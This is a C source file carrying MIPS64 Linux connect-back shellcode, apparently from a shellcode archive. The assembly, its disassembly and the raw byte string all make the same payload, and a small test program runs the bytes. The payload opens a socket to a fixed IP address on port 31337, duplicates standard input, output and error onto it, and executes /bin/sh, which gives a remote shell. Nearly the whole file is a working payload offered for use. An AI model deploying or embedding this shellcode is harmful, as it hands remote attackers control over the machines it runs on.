/*
 * MIPS64r2/Linux-2.6.21.7 - connect back port 31337
 * Author: nicephil
.text
.global __start
.set noreorder
__start:

li      $t3,-3
nor     $a0,$t3,$zero
nor     $a1,$t3,$zero
slti    $a2,$zero,-1
li      $v0,5040 #( sys_socket )
syscall 0x40404

sw      $v0,-1($sp)
lw      $a0,-1($sp)
li      $t3,-3 #( sa_family = AF_INET )
nor     $t3,$t3,$zero
sw      $t3,-32($sp) 
lui     $t3,0x7a69 #( sin_port = 0x7a69 )
ori     $t3,$t3,0x7a69
sw      $t3,-28($sp)

lui     $t3,0xa9fe #( sin_addr = 0xa9fe ... 
ori     $t3,$t3,0xf105 #          ...f105 )
sw      $t3,-26($sp)

daddi   $a1,$sp,-30
li      $t3,-17 #( addrlen = 16 )     
nor     $a2,$t3,$zero 
li      $v0,5041 #( sys_connect ) 
syscall 0x40404


li      $t3,-3
nor     $a1,$t3,$zero
lw      $a0,-1($sp)

dup2_loop:
li      $v0,5032 #( sys_dup2 )
syscall 0x40404 
addi    $a1,$a1,-1
li      $t3,-1
bne     $a1,$t3, dup2_loop


slti    $a2,$zero,-1
lui     $t3,0x2f2f
ori     $t3,$t3,0x6269
sw      $t3,-12($sp)
lui     $t3,0x6e2f
ori     $t3,$t3,0x7368
sw      $t3,-8($sp)
sw      $zero,-4($sp)
daddiu   $a0,$sp,-12
slti    $a1,$zero,-1
li      $v0,5057 #( sys_execve )
syscall 0x40404

0000000000000000 <__start>:
   0:	240ffffd 	li	t3,-3
   4:	01e02027 	nor	a0,t3,zero
   8:	01e02827 	nor	a1,t3,zero
   c:	2806ffff 	slti	a2,zero,-1
  10:	240213b0 	li	v0,5040
  14:	0101010c 	syscall	0x40404
  18:	afa2ffff 	sw	v0,-1(sp)
  1c:	8fa4ffff 	lw	a0,-1(sp)
  20:	240ffffd 	li	t3,-3
  24:	01e07827 	nor	t3,t3,zero
  28:	afafffe0 	sw	t3,-32(sp)
  2c:	3c0f7a69 	lui	t3,0x7a69
  30:	35ef7a69 	ori	t3,t3,0x7a69
  34:	afafffe4 	sw	t3,-28(sp)
  38:	3c0fa9fe 	lui	t3,0xa9fe
  3c:	35eff105 	ori	t3,t3,0xf105
  40:	afafffe6 	sw	t3,-26(sp)
  44:	63a5ffe2 	daddi	a1,sp,-30
  48:	240fffef 	li	t3,-17
  4c:	01e03027 	nor	a2,t3,zero
  50:	240213b1 	li	v0,5041
  54:	0101010c 	syscall	0x40404
  58:	240ffffd 	li	t3,-3
  5c:	01e02827 	nor	a1,t3,zero
  60:	8fa4ffff 	lw	a0,-1(sp)

0000000000000064 <dup2_loop>:
  64:	240213a8 	li	v0,5032
  68:	0101010c 	syscall	0x40404
  6c:	20a5ffff 	addi	a1,a1,-1
  70:	240fffff 	li	t3,-1
  74:	14affffb 	bne	a1,t3,64 <dup2_loop>
  78:	2806ffff 	slti	a2,zero,-1
  7c:	3c0f2f2f 	lui	t3,0x2f2f
  80:	35ef6269 	ori	t3,t3,0x6269
  84:	afaffff4 	sw	t3,-12(sp)
  88:	3c0f6e2f 	lui	t3,0x6e2f
  8c:	35ef7368 	ori	t3,t3,0x7368
  90:	afaffff8 	sw	t3,-8(sp)
  94:	afa0fffc 	sw	zero,-4(sp)
  98:	67a4fff4 	daddiu	a0,sp,-12
  9c:	2805ffff 	slti	a1,zero,-1
  a0:	240213c1 	li	v0,5057
  a4:	0101010c 	syscall	0x40404
 */

#include <stdio.h>
char sc[] = 
"\x24\x0f\xff\xfd"
"\x01\xe0\x20\x27"
"\x01\xe0\x28\x27"
"\x28\x06\xff\xff"
"\x24\x02\x13\xb0"
"\x01\x01\x01\x0c"
"\xaf\xa2\xff\xff"
"\x8f\xa4\xff\xff"
"\x24\x0f\xff\xfd"
"\x01\xe0\x78\x27"
"\xaf\xaf\xff\xe0"
"\x3c\x0f\x7a\x69" //port number
"\x35\xef\x7a\x69"
"\xaf\xaf\xff\xe4"
"\x3c\x0f\xa9\xfe" //ip address
"\x35\xef\xf1\x05"
"\xaf\xaf\xff\xe6"
"\x63\xa5\xff\xe2"
"\x24\x0f\xff\xef"
"\x01\xe0\x30\x27"
"\x24\x02\x13\xb1"
"\x01\x01\x01\x0c"
"\x24\x0f\xff\xfd"
"\x01\xe0\x28\x27"
"\x8f\xa4\xff\xff"
"\x24\x02\x13\xa8"
"\x01\x01\x01\x0c"
"\x20\xa5\xff\xff"
"\x24\x0f\xff\xff"
"\x14\xaf\xff\xfb"
"\x28\x06\xff\xff"
"\x3c\x0f\x2f\x2f"
"\x35\xef\x62\x69"
"\xaf\xaf\xff\xf4"
"\x3c\x0f\x6e\x2f"
"\x35\xef\x73\x68"
"\xaf\xaf\xff\xf8"
"\xaf\xa0\xff\xfc"
"\x67\xa4\xff\xf4"
"\x28\x05\xff\xff"
"\x24\x02\x13\xc1"
"\x01\x01\x01\x0c";

void main ()
{
    void (*s) (void);
    printf ("size: %d\n", strlen (sc));
    s = sc;
    s();
}
